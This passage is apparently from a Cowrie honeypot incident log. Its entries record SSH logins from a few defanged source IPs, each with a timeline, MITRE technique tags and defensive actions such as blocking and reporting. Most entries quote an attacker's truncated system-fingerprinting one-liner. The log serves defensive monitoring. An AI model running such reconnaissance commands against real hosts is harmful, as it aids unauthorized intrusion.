| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:18:37` | `cowrie.session.connect` |
| `2026-07-05 05:18:38` | `cowrie.client.version` |
| `2026-07-05 05:18:38` | `cowrie.client.kex` |
| `2026-07-05 05:18:41` | `cowrie.login.success` |
| `2026-07-05 05:18:41` | `cowrie.session.params` |
| `2026-07-05 05:18:41` | `cowrie.command.input` |
| `2026-07-05 05:18:41` | `cowrie.command.input` |
| `2026-07-05 05:18:41` | `cowrie.command.input` |
| `2026-07-05 05:18:41` | `cowrie.command.input` |
| `2026-07-05 05:18:41` | `cowrie.command.input` |
| `2026-07-05 05:18:41` | `cowrie.command.success` |
| `2026-07-05 05:18:41` | `cowrie.command.input` |
| `2026-07-05 05:18:41` | `cowrie.command.input` |
| `2026-07-05 05:18:41` | `cowrie.command.input` |
| `2026-07-05 05:18:41` | `cowrie.command.input` |
| `2026-07-05 05:18:42` | `cowrie.log.closed` |
| `2026-07-05 05:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69361c8375ce

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:18 |
| **Last Seen** | 2026-07-05 05:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:18:39` | `cowrie.session.connect` |
| `2026-07-05 05:18:39` | `cowrie.client.version` |
| `2026-07-05 05:18:39` | `cowrie.client.kex` |
| `2026-07-05 05:18:44` | `cowrie.login.success` |
| `2026-07-05 05:18:46` | `cowrie.session.params` |
| `2026-07-05 05:18:46` | `cowrie.command.input` |
| `2026-07-05 05:18:46` | `cowrie.command.input` |
| `2026-07-05 05:18:46` | `cowrie.command.input` |
| `2026-07-05 05:18:46` | `cowrie.command.input` |
| `2026-07-05 05:18:46` | `cowrie.command.input` |
| `2026-07-05 05:18:46` | `cowrie.command.success` |
| `2026-07-05 05:18:46` | `cowrie.command.input` |
| `2026-07-05 05:18:46` | `cowrie.command.input` |
| `2026-07-05 05:18:46` | `cowrie.command.input` |
| `2026-07-05 05:18:46` | `cowrie.command.input` |
| `2026-07-05 05:18:48` | `cowrie.log.closed` |
| `2026-07-05 05:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87431fa531dc

| Field | Detail |
|---|---|
| **Source IP** | `34.156.243[.]38` |
| **First Seen** | 2026-07-05 05:18 |
| **Last Seen** | 2026-07-05 05:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:18:46` | `cowrie.session.connect` |
| `2026-07-05 05:18:46` | `cowrie.login.success` |
| `2026-07-05 05:18:47` | `cowrie.session.params` |
| `2026-07-05 05:18:47` | `cowrie.command.input` |
| `2026-07-05 05:18:47` | `cowrie.command.input` |
| `2026-07-05 05:18:47` | `cowrie.command.failed` |
| `2026-07-05 05:18:47` | `cowrie.command.input` |
| `2026-07-05 05:18:47` | `cowrie.log.closed` |
| `2026-07-05 05:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.243[.]38` to AbuseIPDB if not already reported
- [ ] Block `34.156.243[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64d539c0d0f6

| Field | Detail |
|---|---|
| **Source IP** | `34.156.243[.]38` |
| **First Seen** | 2026-07-05 05:19 |
| **Last Seen** | 2026-07-05 05:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:19:00` | `cowrie.session.connect` |
| `2026-07-05 05:19:00` | `cowrie.login.success` |
| `2026-07-05 05:19:01` | `cowrie.session.params` |
| `2026-07-05 05:19:01` | `cowrie.command.input` |
| `2026-07-05 05:19:01` | `cowrie.command.failed` |
| `2026-07-05 05:19:08` | `cowrie.log.closed` |
| `2026-07-05 05:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.243[.]38` to AbuseIPDB if not already reported
- [ ] Block `34.156.243[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-884997ce0e18

| Field | Detail |
|---|---|
| **Source IP** | `34.156.243[.]38` |
| **First Seen** | 2026-07-05 05:19 |
| **Last Seen** | 2026-07-05 05:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:19:02` | `cowrie.session.connect` |
| `2026-07-05 05:19:02` | `cowrie.login.success` |
| `2026-07-05 05:19:03` | `cowrie.session.params` |
| `2026-07-05 05:19:03` | `cowrie.command.input` |
| `2026-07-05 05:19:08` | `cowrie.log.closed` |
| `2026-07-05 05:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.243[.]38` to AbuseIPDB if not already reported
- [ ] Block `34.156.243[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0efb52bf67c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:20 |
| **Last Seen** | 2026-07-05 05:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:20:02` | `cowrie.session.connect` |
| `2026-07-05 05:20:03` | `cowrie.client.version` |
| `2026-07-05 05:20:03` | `cowrie.client.kex` |
| `2026-07-05 05:20:06` | `cowrie.login.success` |
| `2026-07-05 05:20:07` | `cowrie.session.params` |
| `2026-07-05 05:20:07` | `cowrie.command.input` |
| `2026-07-05 05:20:07` | `cowrie.command.input` |
| `2026-07-05 05:20:07` | `cowrie.command.input` |
| `2026-07-05 05:20:07` | `cowrie.command.input` |
| `2026-07-05 05:20:07` | `cowrie.command.input` |
| `2026-07-05 05:20:07` | `cowrie.command.success` |
| `2026-07-05 05:20:07` | `cowrie.command.input` |
| `2026-07-05 05:20:07` | `cowrie.command.input` |
| `2026-07-05 05:20:07` | `cowrie.command.input` |
| `2026-07-05 05:20:07` | `cowrie.command.input` |
| `2026-07-05 05:20:08` | `cowrie.log.closed` |
| `2026-07-05 05:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-119ad9182142

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:20 |
| **Last Seen** | 2026-07-05 05:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:20:03` | `cowrie.session.connect` |
| `2026-07-05 05:20:04` | `cowrie.client.version` |
| `2026-07-05 05:20:04` | `cowrie.client.kex` |
| `2026-07-05 05:20:08` | `cowrie.login.success` |
| `2026-07-05 05:20:10` | `cowrie.session.params` |
| `2026-07-05 05:20:10` | `cowrie.command.input` |
| `2026-07-05 05:20:10` | `cowrie.command.input` |
| `2026-07-05 05:20:10` | `cowrie.command.input` |
| `2026-07-05 05:20:10` | `cowrie.command.input` |
| `2026-07-05 05:20:10` | `cowrie.command.input` |
| `2026-07-05 05:20:10` | `cowrie.command.success` |
| `2026-07-05 05:20:10` | `cowrie.command.input` |
| `2026-07-05 05:20:10` | `cowrie.command.input` |
| `2026-07-05 05:20:10` | `cowrie.command.input` |
| `2026-07-05 05:20:10` | `cowrie.command.input` |
| `2026-07-05 05:20:12` | `cowrie.log.closed` |
| `2026-07-05 05:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3269226acd3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:21 |
| **Last Seen** | 2026-07-05 05:21 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:21:28` | `cowrie.session.connect` |
| `2026-07-05 05:21:29` | `cowrie.client.version` |
| `2026-07-05 05:21:29` | `cowrie.client.kex` |
| `2026-07-05 05:21:32` | `cowrie.login.success` |
| `2026-07-05 05:21:35` | `cowrie.session.params` |
| `2026-07-05 05:21:35` | `cowrie.command.input` |
| `2026-07-05 05:21:35` | `cowrie.command.input` |
| `2026-07-05 05:21:35` | `cowrie.command.input` |
| `2026-07-05 05:21:35` | `cowrie.command.input` |
| `2026-07-05 05:21:35` | `cowrie.command.input` |
| `2026-07-05 05:21:35` | `cowrie.command.success` |
| `2026-07-05 05:21:35` | `cowrie.command.input` |
| `2026-07-05 05:21:35` | `cowrie.command.input` |
| `2026-07-05 05:21:35` | `cowrie.command.input` |
| `2026-07-05 05:21:35` | `cowrie.command.input` |
| `2026-07-05 05:21:37` | `cowrie.log.closed` |
| `2026-07-05 05:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa2b0e05db84

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:21 |
| **Last Seen** | 2026-07-05 05:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:21:32` | `cowrie.session.connect` |
| `2026-07-05 05:21:33` | `cowrie.client.version` |
| `2026-07-05 05:21:33` | `cowrie.client.kex` |
| `2026-07-05 05:21:36` | `cowrie.login.success` |
| `2026-07-05 05:21:39` | `cowrie.session.params` |
| `2026-07-05 05:21:39` | `cowrie.command.input` |
| `2026-07-05 05:21:39` | `cowrie.command.input` |
| `2026-07-05 05:21:39` | `cowrie.command.input` |
| `2026-07-05 05:21:39` | `cowrie.command.input` |
| `2026-07-05 05:21:39` | `cowrie.command.input` |
| `2026-07-05 05:21:39` | `cowrie.command.success` |
| `2026-07-05 05:21:39` | `cowrie.command.input` |
| `2026-07-05 05:21:39` | `cowrie.command.input` |
| `2026-07-05 05:21:39` | `cowrie.command.input` |
| `2026-07-05 05:21:39` | `cowrie.command.input` |
| `2026-07-05 05:21:40` | `cowrie.log.closed` |
| `2026-07-05 05:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-412803d4a42a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:22 |
| **Last Seen** | 2026-07-05 05:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:22:55` | `cowrie.session.connect` |
| `2026-07-05 05:22:56` | `cowrie.client.version` |
| `2026-07-05 05:22:56` | `cowrie.client.kex` |
| `2026-07-05 05:23:00` | `cowrie.login.success` |
| `2026-07-05 05:23:03` | `cowrie.session.params` |
| `2026-07-05 05:23:03` | `cowrie.command.input` |
| `2026-07-05 05:23:03` | `cowrie.command.input` |
| `2026-07-05 05:23:03` | `cowrie.command.input` |
| `2026-07-05 05:23:03` | `cowrie.command.input` |
| `2026-07-05 05:23:03` | `cowrie.command.input` |
| `2026-07-05 05:23:03` | `cowrie.command.success` |
| `2026-07-05 05:23:03` | `cowrie.command.input` |
| `2026-07-05 05:23:03` | `cowrie.command.input` |
| `2026-07-05 05:23:03` | `cowrie.command.input` |
| `2026-07-05 05:23:03` | `cowrie.command.input` |
| `2026-07-05 05:23:04` | `cowrie.log.closed` |
| `2026-07-05 05:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceebb2b9e440

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:23 |
| **Last Seen** | 2026-07-05 05:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:23:01` | `cowrie.session.connect` |
| `2026-07-05 05:23:02` | `cowrie.client.version` |
| `2026-07-05 05:23:02` | `cowrie.client.kex` |
| `2026-07-05 05:23:06` | `cowrie.login.success` |
| `2026-07-05 05:23:08` | `cowrie.session.params` |
| `2026-07-05 05:23:08` | `cowrie.command.input` |
| `2026-07-05 05:23:08` | `cowrie.command.input` |
| `2026-07-05 05:23:08` | `cowrie.command.input` |
| `2026-07-05 05:23:08` | `cowrie.command.input` |
| `2026-07-05 05:23:08` | `cowrie.command.input` |
| `2026-07-05 05:23:08` | `cowrie.command.success` |
| `2026-07-05 05:23:08` | `cowrie.command.input` |
| `2026-07-05 05:23:08` | `cowrie.command.input` |
| `2026-07-05 05:23:08` | `cowrie.command.input` |
| `2026-07-05 05:23:08` | `cowrie.command.input` |
| `2026-07-05 05:23:09` | `cowrie.log.closed` |
| `2026-07-05 05:23:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab70d793699f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:24 |
| **Last Seen** | 2026-07-05 05:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:24:20` | `cowrie.session.connect` |
| `2026-07-05 05:24:21` | `cowrie.client.version` |
| `2026-07-05 05:24:21` | `cowrie.client.kex` |
| `2026-07-05 05:24:24` | `cowrie.login.success` |
| `2026-07-05 05:24:25` | `cowrie.session.params` |
| `2026-07-05 05:24:25` | `cowrie.command.input` |
| `2026-07-05 05:24:25` | `cowrie.command.input` |
| `2026-07-05 05:24:25` | `cowrie.command.input` |
| `2026-07-05 05:24:25` | `cowrie.command.input` |
| `2026-07-05 05:24:25` | `cowrie.command.input` |
| `2026-07-05 05:24:25` | `cowrie.command.success` |
| `2026-07-05 05:24:25` | `cowrie.command.input` |
| `2026-07-05 05:24:25` | `cowrie.command.input` |
| `2026-07-05 05:24:25` | `cowrie.command.input` |
| `2026-07-05 05:24:25` | `cowrie.command.input` |
| `2026-07-05 05:24:26` | `cowrie.log.closed` |
| `2026-07-05 05:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-253d2f1f011e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:24 |
| **Last Seen** | 2026-07-05 05:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:24:28` | `cowrie.session.connect` |
| `2026-07-05 05:24:29` | `cowrie.client.version` |
| `2026-07-05 05:24:29` | `cowrie.client.kex` |
| `2026-07-05 05:24:32` | `cowrie.login.success` |
| `2026-07-05 05:24:34` | `cowrie.session.params` |
| `2026-07-05 05:24:34` | `cowrie.command.input` |
| `2026-07-05 05:24:34` | `cowrie.command.input` |
| `2026-07-05 05:24:34` | `cowrie.command.input` |
| `2026-07-05 05:24:34` | `cowrie.command.input` |
| `2026-07-05 05:24:34` | `cowrie.command.input` |
| `2026-07-05 05:24:34` | `cowrie.command.success` |
| `2026-07-05 05:24:34` | `cowrie.command.input` |
| `2026-07-05 05:24:34` | `cowrie.command.input` |
| `2026-07-05 05:24:34` | `cowrie.command.input` |
| `2026-07-05 05:24:34` | `cowrie.command.input` |
| `2026-07-05 05:24:35` | `cowrie.log.closed` |
| `2026-07-05 05:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01c45bfaa36b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:25 |
| **Last Seen** | 2026-07-05 05:25 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:25:44` | `cowrie.session.connect` |
| `2026-07-05 05:25:45` | `cowrie.client.version` |
| `2026-07-05 05:25:45` | `cowrie.client.kex` |
| `2026-07-05 05:25:50` | `cowrie.login.success` |
| `2026-07-05 05:25:53` | `cowrie.session.params` |
| `2026-07-05 05:25:53` | `cowrie.command.input` |
| `2026-07-05 05:25:53` | `cowrie.command.input` |
| `2026-07-05 05:25:53` | `cowrie.command.input` |
| `2026-07-05 05:25:53` | `cowrie.command.input` |
| `2026-07-05 05:25:53` | `cowrie.command.input` |
| `2026-07-05 05:25:53` | `cowrie.command.success` |
| `2026-07-05 05:25:53` | `cowrie.command.input` |
| `2026-07-05 05:25:53` | `cowrie.command.input` |
| `2026-07-05 05:25:53` | `cowrie.command.input` |
| `2026-07-05 05:25:53` | `cowrie.command.input` |
| `2026-07-05 05:25:54` | `cowrie.log.closed` |
| `2026-07-05 05:25:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
